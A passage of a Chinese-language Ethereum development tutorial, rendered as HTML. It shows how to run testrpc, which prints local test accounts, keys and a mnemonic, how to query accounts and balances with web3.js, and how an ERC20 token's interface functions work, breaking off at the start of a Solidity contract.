" role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">npm</span> WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.2.4 (node_modules/ethereumjs-testrpc/node_modules/fsevents):</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">npm</span> WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform <span class="cm-keyword">for</span> fsevents@1.2.4: wanted {<span class="cm-string">"os"</span>:<span class="cm-string">"darwin"</span>,<span class="cm-string">"arch"</span>:<span class="cm-string">"any"</span>} (current: {<span class="cm-string">"os"</span>:<span class="cm-string">"linux"</span>,<span class="cm-string">"arch"</span>:<span class="cm-string">"x64"</span>})</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">+</span> ethereumjs-testrpc@6.0.3</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">updated <span class="cm-number">1</span> package <span class="cm-keyword">in</span> <span class="cm-number">11</span>.83s</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 238px;"></div><div class="CodeMirror-gutters" style="display: none; height: 238px;"></div></div></div></pre><h4><a name='header-n280' class='md-header-anchor '></a>启动 testrpc</h4><blockquote><p>会自动创建 10 个账户，每个账户默认有 100 个以太币</p></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root:~<span class="cm-comment"># testrpc</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EthereumJS TestRPC v6.0.3 (ganache-core: <span class="cm-number">2</span>.0.2)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Available Accounts</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">==================</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(0) 0x931a85a8b24e00e5aa56651a64dd55f3c849fe14</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(1) 0x7a74f95c7b520f498b31fedcbffaa9a1b12a7dea</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(2) 0xe4ef6200839fd673eb1dd42db3842bb4cbf1450b</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(3) 0x9444971ba35b6dcbca9909021cb6463902940dc6</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(4) 0x79d39a05ec5afda98ccd435ba0124de32a186619</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(5) 0xeaef1169fdb348b44efe860228666a35f2a33476</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(6) 0xb7e4e662bf202c16c4d2e6c9b8254f3dc771f9b2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(7) 0xf887537611c4f20b788c0448e912e29cbc46e398</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(8) 0x33687b265c9910ae865334735959f9d02c874db2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(9) 0x20587c3c3609c4cd954364c828b85077d68357cd</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Private Keys</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">==================</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(0) d59b0b9f2cc918597b558612f77f04bb78caf385f98f9787b83fa7d449328bdd</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(1) a701c5a389856323e88bcc835f7e683ab606c221e9144c7d132605a52517ef79</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(2) 0d08de4f3212a674520501828530c5d8ed39af5c029f0bae7c24a0edebf84d35</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(3) a9b94d7dc5320cce54e8fedc4c527ddcdeb8140345f85fe65a68578535b67299</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(4) a042e22f82b374e5d1ae439da7a7b326a22301fb42477e3136affd71c84e67fb</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(5) d871bfcd1325ab085ffe692aa3d2ab9259c5078c2031f83631b32e3ee614864a</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(6) 750077fca5e502678fcfc60dae7392d0bb4545a7b669da5dd0792dd40bb01143</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(7) cd841189444d94bf833ba626415e519b06048bde7473da53c5a93995859edab2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(8) c41aa3c25c07926f1b36a9b2c004007e7978d1668bb891c1085e1f0e2aa18703</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(9) eafa58b497de55316ec4502891447312577bd186ca8857bb90c321c6939c3cf7</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HD Wallet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">==================</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Mnemonic: &nbsp; &nbsp;  park invite try clap airport summer armed relax split humble unique black</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Base HD Path:  m/44<span class="cm-string">'/60'</span>/0<span class="cm-string">'/0/{account_index}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Listening on localhost:8545</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 813px;"></div><div class="CodeMirror-gutters" style="display: none; height: 813px;"></div></div></div></pre><h4><a name='header-n285' class='md-header-anchor '></a>方式一：交互式操作</h4><ul><li>初始化 web3</li></ul><blockquote><p>执行 node 进入交互式环境，输入（复制 + 粘贴）如下代码</p></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="javascript"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">let</span> <span class="cm-def">Web3</span> <span class="cm-operator">=</span> <span class="cm-variable">require</span>(<span class="cm-string">'web3'</span>);</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">let</span> <span class="cm-def">web3</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">if</span> (<span class="cm-keyword">typeof</span> <span class="cm-variable">web3</span> <span class="cm-operator">!==</span> <span class="cm-string">'undefined'</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">web3</span> <span class="cm-operator">=</span> <span class="cm-keyword">new</span> <span class="cm-variable">Web3</span>(<span class="cm-variable">web3</span>.<span class="cm-property">currentProvider</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">} <span class="cm-keyword">else</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">// set the provider you want from Web3.providers</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">web3</span> <span class="cm-operator">=</span> <span class="cm-keyword">new</span> <span class="cm-variable">Web3</span>(<span class="cm-keyword">new</span> <span class="cm-variable">Web3</span>.<span class="cm-property">providers</span>.<span class="cm-property">HttpProvider</span>(<span class="cm-string">"http://localhost:8545"</span>));</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 215px;"></div><div class="CodeMirror-gutters" style="display: none; height: 215px;"></div></div></div></pre><ul><li>查看账户</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="basic"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;</span> <span class="cm-variable">web3.eth.accounts</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[ <span class="cm-comment">'0x931a85a8b24e00e5aa56651a64dd55f3c849fe14',</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-comment">'0x7a74f95c7b520f498b31fedcbffaa9a1b12a7dea',</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-comment">'0xe4ef6200839fd673eb1dd42db3842bb4cbf1450b',</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-comment">'0x9444971ba35b6dcbca9909021cb6463902940dc6',</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-comment">'0x79d39a05ec5afda98ccd435ba0124de32a186619',</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-comment">'0xeaef1169fdb348b44efe860228666a35f2a33476',</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-comment">'0xb7e4e662bf202c16c4d2e6c9b8254f3dc771f9b2',</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-comment">'0xf887537611c4f20b788c0448e912e29cbc46e398',</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-comment">'0x33687b265c9910ae865334735959f9d02c874db2',</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-comment">'0x20587c3c3609c4cd954364c828b85077d68357cd' ]</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 261px;"></div><div class="CodeMirror-gutters" style="display: none; height: 261px;"></div></div></div></pre><ul><li>查看账户余额</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="basic"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;</span> <span class="cm-variable">web3.eth.getBalance</span>(<span class="cm-comment">'0x931a85a8b24e00e5aa56651a64dd55f3c849fe14')</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">BigNumber</span> { <span class="cm-variable">s</span>: <span class="cm-number">1</span>, <span class="cm-variable">e</span>: <span class="cm-number">20</span>, <span class="cm-variable">c</span>: [ <span class="cm-number">1000000</span> ] }</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 54px;"></div><div class="CodeMirror-gutters" style="display: none; height: 54px;"></div></div></div></pre><h4><a name='header-n304' class='md-header-anchor '></a>方式二：运行 js 脚本</h4><ul><li>创建包含操作的 js 脚本</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="javascript" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">let</span> <span class="cm-def">Web3</span> <span class="cm-operator">=</span> <span class="cm-variable">require</span>(<span class="cm-string">'web3'</span>);</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">let</span> <span class="cm-def">web3</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">if</span> (<span class="cm-keyword">typeof</span> <span class="cm-variable">web3</span> <span class="cm-operator">!==</span> <span class="cm-string">'undefined'</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">web3</span> <span class="cm-operator">=</span> <span class="cm-keyword">new</span> <span class="cm-variable">Web3</span>(<span class="cm-variable">web3</span>.<span class="cm-property">currentProvider</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">} <span class="cm-keyword">else</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">// set the provider you want from Web3.providers</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">web3</span> <span class="cm-operator">=</span> <span class="cm-keyword">new</span> <span class="cm-variable">Web3</span>(<span class="cm-keyword">new</span> <span class="cm-variable">Web3</span>.<span class="cm-property">providers</span>.<span class="cm-property">HttpProvider</span>(<span class="cm-string">"http://localhost:8545"</span>));</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">version</span> <span class="cm-operator">=</span> <span class="cm-variable">web3</span>.<span class="cm-property">version</span>.<span class="cm-property">api</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-variable">version</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-variable">web3</span>.<span class="cm-property">eth</span>.<span class="cm-property">accounts</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-variable">web3</span>.<span class="cm-property">eth</span>.<span class="cm-property">getBalance</span>(<span class="cm-string">'0x3ead381b015ee447e753081f96b918350861417e'</span>));</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 376px;"></div><div class="CodeMirror-gutters" style="display: none; height: 376px;"></div></div></div></pre><ul><li>执行脚本</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root:ethereum<span class="cm-comment"># node test.js</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">0</span>.20.1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[ <span class="cm-string">'0x931a85a8b24e00e5aa56651a64dd55f3c849fe14'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'0x7a74f95c7b520f498b31fedcbffaa9a1b12a7dea'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'0xe4ef6200839fd673eb1dd42db3842bb4cbf1450b'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'0x9444971ba35b6dcbca9909021cb6463902940dc6'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'0x79d39a05ec5afda98ccd435ba0124de32a186619'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'0xeaef1169fdb348b44efe860228666a35f2a33476'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'0xb7e4e662bf202c16c4d2e6c9b8254f3dc771f9b2'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'0xf887537611c4f20b788c0448e912e29cbc46e398'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'0x33687b265c9910ae865334735959f9d02c874db2'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'0x20587c3c3609c4cd954364c828b85077d68357cd'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'0xb272afb0246c0b29768976384713d277ab09a92d'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'0x1a671ee00f4233dcd572c92f88a187a0f134aeca'</span> ]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">BigNumber { s: <span class="cm-number">1</span>, e: <span class="cm-number">0</span>, c: [ <span class="cm-number">0</span> ] }</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 353px;"></div><div class="CodeMirror-gutters" style="display: none; height: 353px;"></div></div></div></pre><h3><a name='header-n315' class='md-header-anchor '></a>以太坊 ERC20 Token</h3><p><img src='pic/blockchain/erc20.png' alt='' referrerPolicy='no-referrer' /></p><h4><a name='header-n318' class='md-header-anchor '></a>编写合约</h4><h5><a name='header-n319' class='md-header-anchor '></a>接口函数</h5><ul><li><code>totalSupply()</code> 函数返回这个 Token 的总发行量;</li><li><code>balanceOf()</code> 查询某个地址的 Token 数量</li><li><code>transfer()</code> owner 使用这个进行发送代币</li><li><code>transferFrom ()</code> Token  的所有者用来发送 Token</li><li><code>allowance()</code> 控制代币的交易，如可交易账号及资产， 控制 Token 的流通</li><li><code>approve()</code> 允许用户可花费的代币数</li></ul><h5><a name='header-n339' class='md-header-anchor '></a>事件函数</h5><p>产生事件，从而可以被前端代码捕获到</p><ul><li>event Transfer() Token 的转账事件</li><li>event Approval() 允许事件</li></ul><blockquote><p>SafeMath 定义了安全的加减乘除操作；ERC20 定义了符合 ERC20 的合约接口；StandardToken 合约继承自 ERC20，是 ERC20 的具体实现，<a href='https://dudebing99.github.io/blog/archives/solidity/erc20_token.sol'>点击下载</a></p></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="javascript" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">pragma</span> <span class="cm-variable">solidity</span> <span class="cm-operator">^</span><span class="cm-number">0.4.24</span>;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> * References:</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> * https://eips.ethereum.org/EIPS/eip-20</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> * https://github.com/ethereum/EIPs/issues/20</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> * https://github.com/OpenZeppelin/openzeppelin-solidity</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " 